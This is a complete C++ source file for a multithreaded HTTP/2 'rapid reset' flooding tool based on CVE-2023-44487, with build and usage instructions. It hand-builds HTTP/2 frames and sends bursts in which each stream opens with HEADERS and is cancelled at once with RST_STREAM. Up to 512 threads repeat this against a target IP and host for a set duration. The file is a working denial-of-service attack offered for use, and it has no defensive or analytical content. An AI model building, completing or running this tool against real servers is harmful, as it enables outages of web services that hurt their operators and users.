// storm_h2.cpp — HTTP/2 rapid-reset pressure engine (CVE-2023-44487 pattern)
// build:  g++ -O2 -pthread storm_h2.cpp -o storm_h2
// usage:  ./storm_h2 <ip> <port> <host> <threads> <streams_per_conn> <duration_s>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <pthread.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>

struct Job {
    std::string ip, host;
    int port, streams, duration;
};

static std::vector<uint8_t> frame(uint8_t type, uint8_t flags, uint32_t sid, const std::vector<uint8_t>& payload) {
    std::vector<uint8_t> f;
    f.push_back((payload.size() >> 16) & 0xff);
    f.push_back((payload.size() >> 8) & 0xff);
    f.push_back(payload.size() & 0xff);
    f.push_back(type);
    f.push_back(flags);
    f.push_back((sid >> 24) & 0x7f);
    f.push_back((sid >> 16) & 0xff);
    f.push_back((sid >> 8) & 0xff);
    f.push_back(sid & 0xff);
    f.insert(f.end(), payload.begin(), payload.end());
    return f;
}

static std::vector<uint8_t> hpack_lit(const std::string& name, const std::string& value) {
    std::vector<uint8_t> b;
    b.push_back(0x00);
    b.push_back((uint8_t)name.size());
    b.insert(b.end(), name.begin(), name.end());
    b.push_back((uint8_t)value.size());
    b.insert(b.end(), value.begin(), value.end());
    return b;
}

static std::vector<uint8_t> build_burst(const std::string& host, int streams) {
    const char* preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    std::vector<uint8_t> buf(preface, preface + 24);
    std::vector<uint8_t> empty;
    std::vector<uint8_t> settings = frame(0x4, 0, 0, empty);
    buf.insert(buf.end(), settings.begin(), settings.end());

    std::vector<uint8_t> hb = hpack_lit(":method", "GET");
    std::vector<uint8_t> t = hpack_lit(":scheme", "https");
    hb.insert(hb.end(), t.begin(), t.end());
    t = hpack_lit(":path", "/");
    hb.insert(hb.end(), t.begin(), t.end());
    t = hpack_lit(":authority", host);
    hb.insert(hb.end(), t.begin(), t.end());

    std::vector<uint8_t> rst(4, 0);
    rst[3] = 0x08;  // CANCEL
    for (uint32_t sid = 1; sid < (uint32_t)streams * 2; sid += 2) {
        std::vector<uint8_t> hf = frame(0x1, 0x4, sid, hb);
        buf.insert(buf.end(), hf.begin(), hf.end());
        std::vector<uint8_t> rf = frame(0x3, 0, sid, rst);
        buf.insert(buf.end(), rf.begin(), rf.end());
    }
    return buf;
}

static void* pummel(void* arg) {
    Job* j = (Job*)arg;
    std::vector<uint8_t> burst = build_burst(j->host, j->streams);
    sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(j->port);
    inet_pton(AF_INET, j->ip.c_str(), &dst.sin_addr);

    time_t end = time(nullptr) + j->duration;
    while (time(nullptr) < end) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        int one = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
        fcntl(fd, F_SETFL, O_NONBLOCK);
        int rc = connect(fd, (sockaddr*)&dst, sizeof(dst));
        if (rc != 0) {
            pollfd p{fd, POLLOUT, 0};
            rc = poll(&p, 1, 1500);
        }
        if (rc > 0) {
            send(fd, burst.data(), burst.size(), MSG_NOSIGNAL);
        }
        close(fd);
    }
    return nullptr;
}

int main(int argc, char** argv) {
    if (argc < 7) {
        fprintf(stderr, "usage: %s <ip> <port> <host> <threads> <streams_per_conn> <duration_s>\n", argv[0]);
        return 1;
    }
    Job j{argv[1], argv[3], atoi(argv[2]), atoi(argv[5]), atoi(argv[6])};
    int threads = atoi(argv[4]);
    pthread_t th[512];
    for (int i = 0; i < threads && i < 512; i++) pthread_create(&th[i], nullptr, pummel, &j);
    for (int i = 0; i < threads && i < 512; i++) pthread_join(th[i], nullptr);
    return 0;
}
